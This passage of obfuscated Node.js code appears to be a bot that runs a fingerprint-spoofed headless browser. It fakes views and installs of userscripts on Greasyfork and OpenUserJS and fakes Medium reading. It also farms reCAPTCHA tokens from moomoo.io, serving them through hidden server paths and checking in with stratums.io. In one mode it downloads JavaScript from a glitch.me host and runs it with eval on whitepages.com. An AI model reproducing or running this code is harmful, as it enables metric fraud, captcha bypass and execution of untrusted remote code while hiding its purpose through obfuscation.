      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + X(0x9, '*#fd') + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + Z(0x23) + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    Y(0x17) + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    Z(0x4) + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + Y(0x14) + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + Z(0x19) + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + Y(0x10) + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    X(0x1c, 'Nkpy') + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + Y(0x1a) + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x2118 + -0x3dc + 0x24f4
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x10ae + -0x1de8 + 0x2e96)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0xa7 * -0x1d + 0x1cd5 + -0x2f5c), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x43 * 0x7d + -0x104f + -0x47e * -0xb), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1e92 + 0x2405 * 0x1 + -0x4297;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x6ca + 0x49 * 0x7f + 0x1b * -0x117; w < getRandomInt(0x1de5 * -0x1 + 0xeb2 + -0x3cd * -0x4, -0x2bc + -0x765 * 0x1 + 0xa26); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1 * 0x1158d + -0x19d31 + -0x1 * -0x17204);
        }
      }();
    }, 0x132a + -0x1 * -0x229d + -0x3563), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0xf78 + 0x23f2 + 0x1 * -0x147a;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x2 * 0x11f6 + -0x3 * -0x358 + -0x2df4 * 0x1, -0x8b * 0x8 + -0x54e * 0x6 + -0xbe * -0x31)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x5cbc + 0xa34e * -0x1 + 0x3 * 0x3e96);
    }, 0x58c + 0x121 * -0xa + -0x5 * -0x13a), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1855 + 0x8 * 0x43 + 0x163d;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x60e + -0x299 * 0x2 + 0x118 * 0x15), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x11ca + 0x90c + 0x8be), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0xbf05 * 0xd + -0x5 * 0x439f9 + -0x21f46 * -0x15);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1ca5 * -0x1 + -0x1457 + -0x9e0 * -0x5);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1 * -0x1679 + -0xf19 + 0x265a);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x1 * -0x61 + 0x94e * -0x5 + 0x4e77);
}
doFlags['doOUJS'] && ((async () => {
  const bh = {
      f: 0x1d
    },
    a2 = b,
    a1 = d,
    a0 = c;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x616 * -0x6 + -0x47f * 0x2 + -0x5 * 0x581) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x6 * 0x33d + -0x235e + -0xff1 * -0x1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0xa38 + 0x7e4 + 0x254, D['indexOf']('\x20'));
        return B ? E['slice'](-0x226f + -0x202a + 0x3 * 0x1633, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x1bbb + 0x256 * 0x7 + 0x3271 * 0x1),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x3 * 0x4ff + -0x136 * -0x24 + 0xa75 * 0x1),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a0(0x0) + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + a1(0x22),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + a2(0x15, 'YVYc'),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + a1(0x1b) + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + a1(bh.f) + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
